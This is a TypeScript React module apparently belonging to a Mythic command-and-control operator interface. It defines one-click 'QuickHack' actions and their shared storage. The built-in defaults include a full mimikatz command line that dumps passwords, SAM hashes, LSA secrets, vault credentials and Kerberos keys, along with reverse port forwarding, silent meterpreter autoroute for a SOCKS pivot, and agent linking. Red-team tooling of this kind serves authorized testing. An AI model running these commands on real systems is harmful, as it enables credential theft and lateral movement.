import { useCallback, useMemo } from 'react';
import { useApolloClient, useMutation, useReactiveVar, useSubscription } from '@apollo/client/react';
import { meState } from './state';
import {
    SUBSCRIBE_QUICKHACKS,
    GET_QUICKHACKS,
    UPSERT_QUICKHACK,
    DELETE_QUICKHACK,
} from './api/quickhacks';

export interface QuickHackVariable {
    key: string;          // placeholder name used in params, e.g. "TARGET_IP"
    type: 'ip' | 'number';
}

export interface QuickHackStep {
    command: string;    // Mythic command name
    params: string;     // command params — use {{KEY}} to reference variables
}

/** Author metadata captured when a quickhack is created. */
export interface QuickHackAuthor {
    operator_id?: number;
    username: string;
}

/** Known agent types — used for agent restriction labels/filters.
 *  Includes 'meterpreter' so the same Quickhack model can describe both
 *  Mythic agents and Metasploit (synthetic) sessions. */
export const KNOWN_AGENT_TYPES = ['apollo', 'poseidon', 'medusa', 'hermes', 'thanatos', 'scarecrow', 'freyja', 'merlin', 'meterpreter'] as const;
export type KnownAgentType = typeof KNOWN_AGENT_TYPES[number];

/**
 * Prefix marking a Quickhack step that's handled client-side by Minerva
 * instead of being sent to Mythic as a task. Known actions include
 * `minerva://msf-autoroute` (silent autoroute autoadd on a meterpreter
 * session — used by the default SOCKS Quickhack) and
 * `minerva://msf-socks-dialog` (manual route editor — used from the
 * Callbacks ⋮ menu). Anything not matching `minerva://<known-action>`
 * fails the step with a clear error.
 */
export const MINERVA_ACTION_PREFIX = 'minerva://';

export interface QuickHackDef {
    id: string;
    name: string;
    description: string;
    icon: string;       // lucide icon name (e.g. "Zap", "Shield")
    color: string;      // accent color hex
    command: string;    // legacy single command (kept for backward compat)
    params: string;     // legacy single params
    steps: QuickHackStep[];  // ordered list of commands to execute (default variant)
    /**
     * Per-agent step overrides. When invoked on an agent whose type is a
     * key in this map, the override list replaces `steps` entirely. Lets
     * one Quickhack describe different command lists for different agents
     * (e.g. `apollo: shell whoami` vs `meterpreter: getuid`), plus
     * client-side `minerva://` actions for agent types Mythic can't task
     * directly. Keys are lowercased agent type names.
     */
    agentSteps?: Record<string, QuickHackStep[]>;
    variables?: QuickHackVariable[];
    /** Agent types this hack is compatible with. Empty/undefined = all agents. */
    agentTypes?: string[];
    /** True for built-in default hacks, false/undefined for user-created. */
    isDefault?: boolean;
    /** Operator who created this hack — undefined for built-in defaults. */
    author?: QuickHackAuthor;
}

/**
 * Resolve the effective step list for this Quickhack.
 *
 * Lookup order:
 *   1. If `agentType` is provided AND `agentSteps[agentType]` exists and
 *      is non-empty → return that variant (case-insensitive match).
 *   2. Otherwise fall back to `steps` (the default variant).
 *   3. Legacy single command/params shape is migrated to a one-step
 *      array if nothing else is set.
 */
export function getHackSteps(hack: QuickHackDef, agentType?: string | null): QuickHackStep[] {
    if (agentType && hack.agentSteps) {
        const key = agentType.toLowerCase();
        const variant = hack.agentSteps[key];
        if (Array.isArray(variant) && variant.length > 0) return variant;
    }
    if (hack.steps && hack.steps.length > 0) return hack.steps;
    if (hack.command) return [{ command: hack.command, params: hack.params }];
    return [];
}

/** Lowercase list of agent types that have a defined override variant. */
export function getAgentVariantKeys(hack: QuickHackDef): string[] {
    if (!hack.agentSteps) return [];
    return Object.keys(hack.agentSteps).filter(k => Array.isArray(hack.agentSteps![k]) && hack.agentSteps![k].length > 0);
}

/** Returns true if a step is a client-side Minerva action (not sent to Mythic). */
export function isMinervaAction(step: QuickHackStep): boolean {
    return typeof step.command === 'string' && step.command.startsWith(MINERVA_ACTION_PREFIX);
}

/** Strip the prefix off a minerva:// command, returning the action key. */
export function parseMinervaAction(step: QuickHackStep): string {
    return step.command.slice(MINERVA_ACTION_PREFIX.length);
}

/** Parse params string to detect {{KEY}} placeholders and match them to defined variables */
export function resolveParams(params: string, variables: QuickHackVariable[], values: Record<string, string>): string {
    let resolved = params;
    for (const v of variables) {
        resolved = resolved.replaceAll(`{{${v.key}}}`, values[v.key] ?? '');
    }
    return resolved;
}

/**
 * Returns true if the hack — *as it would be invoked on this agent type* —
 * actually needs operator input. A hack that declares `SOCKS_PORT` but
 * routes meterpreter through `minerva://msf-socks-dialog` (no placeholder
 * usage) won't need the operator to fill that variable.
 */
export function hackNeedsInput(hack: QuickHackDef, agentType?: string | null): boolean {
    const vars = hack.variables ?? [];
    if (vars.length === 0) return false;
    const steps = getHackSteps(hack, agentType);
    return vars.some(v => {
        const ref = `{{${v.key}}}`;
        return steps.some(s => (s.params || '').includes(ref) || (s.command || '').includes(ref));
    });
}

/**
 * Returns true if the hack is compatible with the given agent type.
 *
 * Compatibility sources (any one is enough):
 *   - `agentTypes` is empty/undefined (unrestricted hack)
 *   - `agentTypes` contains this type
 *   - `agentSteps` defines a variant keyed on this type (an explicit
 *     override is itself a declaration that the hack supports the type)
 *
 * If agentType is unknown/null, returns true (show all — operator decides).
 */
export function isHackCompatible(hack: QuickHackDef, agentType: string | null | undefined): boolean {
    if (!agentType) return true;
    const lower = agentType.toLowerCase();
    if (hack.agentSteps && Array.isArray(hack.agentSteps[lower]) && hack.agentSteps[lower].length > 0) return true;
    if (!hack.agentTypes || hack.agentTypes.length === 0) return true;
    return hack.agentTypes.map(a => a.toLowerCase()).includes(lower);
}

/** Format agent type restriction label for display, e.g. "APOLLO / POSEIDON" */
export function formatAgentTypes(agentTypes: string[] | undefined): string {
    if (!agentTypes || agentTypes.length === 0) return 'ALL AGENTS';
    return agentTypes.map(a => a.toUpperCase()).join(' / ');
}

/** Extract all IP addresses from a callback ip field (may be JSON array or plain string) */
export function extractAllIPs(ip: any): string[] {
    if (!ip) return [];
    let candidates: string[] = [];
    if (typeof ip === 'string') {
        const trimmed = ip.trim();
        if (trimmed.startsWith('[')) {
            try { candidates = JSON.parse(trimmed); } catch { candidates = [trimmed]; }
        } else {
            candidates = [trimmed];
        }
    } else if (Array.isArray(ip)) {
        candidates = ip.map(String);
    } else {
        return [String(ip)];
    }
    return candidates.map(c => c.trim()).filter(Boolean);
}

export const DEFAULT_QUICKHACKS: QuickHackDef[] = [
    {
        id: 'harvest',
        name: 'HARVEST',
        description: 'Extract credentials, tokens, cached secrets & encryption keys from target memory  [Apollo / Windows only]',
        icon: 'Zap',
        color: '#ff003c',
        command: 'mimikatz',
        params: '"privilege::debug" "sekurlsa::logonpasswords" "token::elevate" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "vault::cred /patch" "sekurlsa::ekeys" exit',
        steps: [
            { command: 'mimikatz', params: '"privilege::debug" "sekurlsa::logonpasswords" "token::elevate" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "vault::cred /patch" "sekurlsa::ekeys" exit' },
        ],
        variables: [],
        agentTypes: ['apollo'],
        isDefault: true,
    },
    {
        id: 'rpfwd_start',
        name: 'RPFWD',
        description: 'Start a Reverse Port Forward — open a local port on the agent and forward connections to a remote host:port',
        icon: 'ArrowLeftRight',
        color: '#00aaff',
        command: 'rpfwd',
        params: '{"action":"start","port":{{LOCAL_PORT}},"remote_ip":"{{REMOTE_IP}}","remote_port":{{REMOTE_PORT}}}',
        steps: [
            { command: 'rpfwd', params: '{"action":"start","port":{{LOCAL_PORT}},"remote_ip":"{{REMOTE_IP}}","remote_port":{{REMOTE_PORT}}}' },
        ],
        variables: [
            { key: 'LOCAL_PORT', type: 'number' },
            { key: 'REMOTE_IP', type: 'ip' },
            { key: 'REMOTE_PORT', type: 'number' },
        ],
        agentTypes: ['apollo', 'poseidon'],
        isDefault: true,
    },
    {
        id: 'socks_start',
        name: 'SOCKS',
        description: 'Start a SOCKS5 proxy — Mythic agents take a local port; meterpreter sessions autoroute every reachable subnet silently',
        icon: 'Network',
        color: '#a855f7',
        command: 'socks',
        params: '{"action":"start","port":{{SOCKS_PORT}}}',
        steps: [
            { command: 'socks', params: '{"action":"start","port":{{SOCKS_PORT}}}' },
        ],
        // Meterpreter variant: silently run autoroute autoadd on the
        // target so the per-operation SOCKS server picks up every
        // subnet the box can reach. No dialog, no confirmation — the
        // operator's next proxychains4 connection sees them all.
        // (The Callbacks ⋮ menu still has a dialog for manual edits.)
        agentSteps: {
            meterpreter: [
                { command: 'minerva://msf-autoroute', params: '' },
            ],
        },
        variables: [
            { key: 'SOCKS_PORT', type: 'number' },
        ],
        agentTypes: ['apollo', 'poseidon', 'meterpreter'],
        isDefault: true,
    },
    {
        id: 'p2p_unlink',
        name: 'DISCONNECT',
        description: 'Close every active P2P link sourced at this callback. Best-effort runs the agent\'s `unlink` command, then force-closes the Mythic `callbackgraphedge` so the visual goes away even when the agent forgot to tell Mythic.',
        icon: 'Zap',
        color: '#ff003c',
        command: 'minerva://unlink',
        params: '',
        steps: [
            { command: 'minerva://unlink', params: '' },
        ],
        variables: [],
        agentTypes: ['apollo', 'poseidon'],
        isDefault: true,
    },
    {
        id: 'p2p_link',
        name: 'AMPLIFICATION',
        description: 'Connect this agent to a remote TCP P2P payload (parent→child link). Two args: target IP and listener port.',
        icon: 'Link2',
        color: '#22d3ee',
        // Agent-side link commands aren't literally named "link" — Apollo
        // calls its TCP linker `link_tcp`, other agents use other names.
        // Parameter names also differ (`address` vs `host`, …). The
        // dispatcher resolves both: it picks whichever link command is
        // loaded on this callback, then introspects its parameters and
        // builds the JSON body with the right keys.
        //
        // Params here stay as a simple `<IP> <PORT>` pair; the dispatcher
        // splits them and reassembles.
        command: 'minerva://link',
        params: '{{TARGET_IP}} {{TARGET_PORT}}',
        steps: [
            { command: 'minerva://link', params: '{{TARGET_IP}} {{TARGET_PORT}}' },
        ],
        variables: [
            { key: 'TARGET_IP', type: 'ip' },
            { key: 'TARGET_PORT', type: 'number' },
        ],
        agentTypes: ['apollo', 'poseidon'],
        isDefault: true,
    },
];

// ════════════════════════════════════════════════════════════════════════════
//  Operation-shared storage (agentstorage rows, key = minerva_quickhack_{op}_{id})
// ════════════════════════════════════════════════════════════════════════════

const QUICKHACK_KEY_PREFIX = 'minerva_quickhack_';
const opPrefix = (operationId: number) => `${QUICKHACK_KEY_PREFIX}${operationId}_`;
const uniqueIdFor = (operationId: number, hackId: string) => `${opPrefix(operationId)}${hackId}`;

const safeBase64Encode = (s: string): string => btoa(unescape(encodeURIComponent(s)));
const safeBase64Decode = (s: string): string => {
    try { return decodeURIComponent(escape(atob(s))); } catch { return atob(s); }
};
const hexToString = (hex: string): string => {
    const bytes = hex.match(/.{1,2}/g);
    if (!bytes) throw new Error('Invalid hex');
    return bytes.map(b => String.fromCharCode(parseInt(b, 16))).join('');
};

/** Decode an agentstorage `data` cell (object | json | base64 | \\xHEX) into a typed value. */
function parseAgentStorageData<T>(data: any): T {
    if (typeof data === 'object' && data !== null) return data as T;
    if (typeof data !== 'string') throw new Error(`Bad data type: ${typeof data}`);
    try { return JSON.parse(data) as T; } catch { /* not raw JSON */ }
    if (data.startsWith('\\x')) {
        try { return JSON.parse(safeBase64Decode(hexToString(data.substring(2)))) as T; } catch { /* fall through */ }
    }
    try { return JSON.parse(safeBase64Decode(data)) as T; } catch { /* fall through */ }
    throw new Error('Failed to parse storage data');
}

/** Defensive shape coercion for hacks loaded from storage (legacy/partial fields). */
function normalizeHack(raw: any): QuickHackDef {
    const steps: QuickHackStep[] = Array.isArray(raw.steps) && raw.steps.length > 0
        ? raw.steps
        : raw.command ? [{ command: raw.command, params: raw.params ?? '' }] : [];
    const defaultMatch = DEFAULT_QUICKHACKS.find(d => d.id === raw.id);
    // Coerce agentSteps map: only keep keys that map to non-empty step
    // arrays of well-formed entries; everything else is dropped.
    const agentSteps: Record<string, QuickHackStep[]> = {};
    const rawAgentSteps = raw.agentSteps && typeof raw.agentSteps === 'object' ? raw.agentSteps : null;
    if (rawAgentSteps) {
        for (const [k, v] of Object.entries(rawAgentSteps)) {
            if (!Array.isArray(v) || v.length === 0) continue;
            const cleaned = v
                .filter(s => s && typeof (s as any).command === 'string' && (s as any).command.trim() !== '')
                .map(s => ({ command: String((s as any).command), params: String((s as any).params ?? '') }));
            if (cleaned.length > 0) agentSteps[k.toLowerCase()] = cleaned;
        }
    }
    // Fall back to the bundled default's agentSteps for built-ins so they
    // re-appear after a corrupt round-trip strips them.
    const finalAgentSteps = Object.keys(agentSteps).length > 0
        ? agentSteps
        : (defaultMatch?.agentSteps ?? undefined);
    return {
        id: String(raw.id),
        name: String(raw.name ?? ''),
        description: String(raw.description ?? ''),
        icon: typeof raw.icon === 'string' && /^[A-Z][a-zA-Z]+$/.test(raw.icon) ? raw.icon : 'Zap',
        color: String(raw.color ?? '#22d3ee'),
        command: steps[0]?.command ?? '',
        params: steps[0]?.params ?? '',
        steps,
        agentSteps: finalAgentSteps,
        variables: Array.isArray(raw.variables)
            ? raw.variables.map((v: any) => ({ key: String(v.key ?? ''), type: v.type === 'port' ? 'number' : (v.type ?? 'number') }))
            : [],
        agentTypes: Array.isArray(raw.agentTypes) ? raw.agentTypes : (defaultMatch?.agentTypes ?? []),
        isDefault: typeof raw.isDefault === 'boolean' ? raw.isDefault : (defaultMatch?.isDefault ?? false),
        author: raw.author && typeof raw.author === 'object'
            ? { operator_id: raw.author.operator_id, username: String(raw.author.username ?? 'unknown') }
            : undefined,
    };
}

export interface UseQuickHacksResult {
    hacks: QuickHackDef[];
    loading: boolean;
    refetch: () => Promise<void>;
}

/**
 * Live operation-shared QuickHacks. Returns built-in defaults merged with any
 * operator-authored hacks stored in agentstorage for the current operation.
 * Subscribes to changes so hacks added by other operators appear automatically.
 */
export function useQuickHacks(): UseQuickHacksResult {
    const client = useApolloClient();
    const me = useReactiveVar(meState);
    const opId = me.user?.current_operation_id ?? 0;
    const prefix = `${opPrefix(opId)}%`;

    const { data, loading } = useSubscription<any>(SUBSCRIBE_QUICKHACKS, {
        variables: { prefix },
        skip: opId === 0,
        fetchPolicy: 'no-cache',
        shouldResubscribe: true,
    });

    const refetch = useCallback(async () => {
        if (opId === 0) return;
        await client.query({
            query: GET_QUICKHACKS,
            variables: { prefix },
            fetchPolicy: 'network-only',
        });
    }, [client, prefix, opId]);

    const hacks = useMemo<QuickHackDef[]>(() => {
        const stored: QuickHackDef[] = [];
        for (const row of data?.agentstorage ?? []) {
            try { stored.push(normalizeHack(parseAgentStorageData(row.data))); }
            catch { /* skip corrupted rows */ }
        }
        // Merge defaults with stored — stored entries override defaults by ID.
        const map = new Map<string, QuickHackDef>();
        for (const d of DEFAULT_QUICKHACKS) map.set(d.id, d);
        for (const s of stored) map.set(s.id, s);
        return Array.from(map.values());
    }, [data]);

    return { hacks, loading, refetch };
}

/** Returns a function that creates/updates a quickhack in operation-shared storage. */
export function useUpsertQuickHack(): (hack: QuickHackDef) => Promise<void> {
    const me = useReactiveVar(meState);
    const opId = me.user?.current_operation_id ?? 0;
    const [mutate] = useMutation<any>(UPSERT_QUICKHACK);
    return useCallback(async (hack: QuickHackDef) => {
        if (opId === 0) throw new Error('No active operation');
        const author: QuickHackAuthor = hack.author ?? {
            operator_id: typeof me.user?.user_id === 'number' ? me.user.user_id : undefined,
            username: me.user?.username ?? 'unknown',
        };
        const finalHack: QuickHackDef = { ...hack, author, isDefault: false };
        const encoded = safeBase64Encode(JSON.stringify(finalHack));
        await mutate({
            variables: {
                unique_id: uniqueIdFor(opId, hack.id),
                data: encoded,
            },
        });
    }, [mutate, me.user, opId]);
}

/** Returns a function that deletes a quickhack from operation-shared storage. */
export function useDeleteQuickHack(): (hackId: string) => Promise<void> {
    const me = useReactiveVar(meState);
    const opId = me.user?.current_operation_id ?? 0;
    const [mutate] = useMutation<any>(DELETE_QUICKHACK);
    return useCallback(async (hackId: string) => {
        if (opId === 0) throw new Error('No active operation');
        await mutate({ variables: { unique_id: uniqueIdFor(opId, hackId) } });
    }, [mutate, opId]);
}
